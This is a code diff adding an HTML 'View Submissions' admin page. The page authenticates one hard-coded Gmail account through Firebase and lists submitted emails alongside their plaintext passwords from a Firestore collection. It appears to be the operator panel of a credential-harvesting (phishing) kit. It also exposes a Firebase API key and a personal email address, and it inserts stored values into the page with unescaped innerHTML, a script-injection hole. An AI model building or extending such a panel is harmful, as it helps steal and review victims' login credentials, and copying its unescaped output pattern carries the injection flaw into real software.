@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+<title>View Submissions - Admin</title>
+<style>
+body{margin:0;font-family:'Orbitron',sans-serif;background:#121212;color:#fff;padding:20px;}
+table{width:100%;border-collapse:collapse;margin-top:20px;}
+th,td{padding:12px;border-bottom:1px solid #444;text-align:left;}
+th{background:#8e24aa;}
+tr:hover{background:#333;}
+.back-btn{padding:8px 15px;border:none;border-radius:5px;background:#555;color:#fff;cursor:pointer;margin-bottom:10px;}
+.back-btn:hover{background:#777;}
+</style>
+</head>
+<body>
+<button class="back-btn" onclick="goBack()">← Back</button>
+<h1>Submissions</h1>
+<table>
+<thead><tr><th>Email</th><th>Password</th><th>Submitted At</th></tr></thead>
+<tbody id="submissionList"></tbody>
+</table>
+
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>
+
+<script>
+const firebaseConfig = {
+apiKey: "AIzaSyAmSC92mozosP8JdQGOzF7KE9wCa-h4b_E",
+authDomain: "authdomain-b606b.firebaseapp.com",
+projectId: "authdomain-b606b",
+storageBucket: "authdomain-b606b.firebasestorage.app",
+messagingSenderId: "374508656476",
+appId: "1:374508656476:web:1a1affe311734602bc5399",
+measurementId: "G-FH5BSP31E7"
+};
+if(!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+const auth=firebase.auth();
+const db=firebase.firestore();
+
+auth.onAuthStateChanged(user=>{
+if(!user || user.email!=="abdullahyt4622@gmail.com") window.location.href="index.html";
+else loadSubmissions();
+});
+
+function loadSubmissions(){
+db.collection("submissions").orderBy("submittedAt","desc").get().then(snapshot=>{
+const tbody=document.getElementById("submissionList");
+tbody.innerHTML="";
+snapshot.forEach(doc=>{
+const data=doc.data();
+const time=data.submittedAt?data.submittedAt.toDate().toLocaleString():"N/A";
+const tr=document.createElement("tr");
+tr.innerHTML=`<td>${data.email}</td><td>${data.password}</td><td>${time}</td>`;
+tbody.appendChild(tr);
+});
+});
+}
+
+function goBack(){window.location.href="index.html";}
+</script>
+</body>
+</html>
